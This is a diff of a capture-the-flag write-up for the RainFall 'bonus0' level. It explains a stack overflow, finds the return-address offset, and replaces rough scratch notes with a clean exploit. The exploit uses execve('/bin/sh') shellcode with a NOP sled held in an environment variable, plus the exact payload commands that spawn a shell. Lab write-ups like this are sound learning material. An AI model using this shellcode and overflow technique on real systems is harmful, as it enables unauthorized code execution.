@@ -1,48 +1,43 @@
-(gdb) print system
-$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
-(gdb) find &system,+9999999,"/bin/sh"
-0xb7f8cc58
-warning: Unable to access target memory at 0xb7fd3160, halting search.
-1 pattern found.
+##  Description
 
-with a * 20:
-aaaaaaaaaaaaaaaaaaa\x60\xb0\xe6\xb7
+The disassembly of this binary does not show anything particularly difficult to interpret, and the source code is relatively straightforward.
 
-BBBB\x58\xcc\xf8\xb7
+The program uses multiple buffers, and the one used to get user input is particularly large (4096 bytes).
 
+Once the user input is read, strchr() is used to find any newline character and replace it with a null terminator.
 
+First off, we can try to overflow the buffer and see what happens:
 
-aaaaaaaaaaaaaaa\x60\xb0\xe6\xb7
-
-(python -c 'print "A"*20'; python -c 'print "BBBBbbbbBBBB" + "\x58\xcc\xf8\xb7" ') | ./bonus0
-
-
-41336141
- A 3 a A
-
-little endian > Aa3A
-
-AAAAAAAAAAAAAAAAAAAA
-
-BBBBbbbbBBBBbbbb0000
-
-(python -c 'print "A"*0x1000'; python -c 'print "BBBB" + "\x60\xb0\xe6\xb7" + "CCCC" + "\x58\xcc\xf8\xb7"'; cat) | ./bonus0
-
-
+```bash
 Starting program: /home/user/bonus0/bonus0 
  - 
-AAAAAAAAAAAAAAAAAAAA
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7    // 24 bytes, 4 bytes overflow
  - 
-00002222333344445555
-AAAAAAAAAAAAAAAAAAAA00002222333344445555��� 00002222333344445555���
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7    // 24 bytes, 4 bytes overflow
+Aa0Aa1Aa2Aa3Aa4Aa5AaAa0Aa1Aa2Aa3Aa4Aa5Aa��� Aa0Aa1Aa2Aa3Aa4Aa5Aa���
 
 Program received signal SIGSEGV, Segmentation fault.
-0x34333333 in ?? ()
-   
+0x41336141 in ?? ()
+^ "Aa3A" -> offset 9
+```
 
-00002222333344445555
-         ^^^^
+So the return address is located at offset 9, and it is overwritable.
 
-python -c "print '0' *4095 + '\n' + 'Aa0Aa1Aa2' + '\x58\xcc\xf8\xb7' > /tmp/payload
+It would be tempting to try and overwrite the return address with the address of system() like we did in the previous levels, but we are blocked by the strncpy() which only copies 20 bytes in p(), preventing the overflow.
 
-cat /tmp/file - | env -i payload=$(python -c 'print "\x90"*500+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') ./bonus0
+One way to bypass this is to use an environment variable to store a shellcode, and redirect the execution flow to the address it's stored at.
+
+```bash
+bonus0@RainFall:~$ export shellcode=$(python -c 'print "\x90"*153 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
+                                                        ^ nop sled
+bonus0@RainFall:~$ (python -c 'print("A" * 20)'; python -c 'print("B" * 9 + "\xb8\xfe\xff\xbf" + "B"*7)'; cat) | ./bonus0
+ - 
+ - 
+AAAAAAAAAAAAAAAAAAAABBBBBBBBB����BBBBBBB��� BBBBBBBBB����BBBBBBB���
+whoami
+bonus1
+```
+
+Note the use of a nop sled to increase the chances of hitting the shellcode, and the address of the environment variable which is located at 0xbffffeb8.
+
+[Source for the shellcode](https://www.exploit-db.com/exploits/13628)
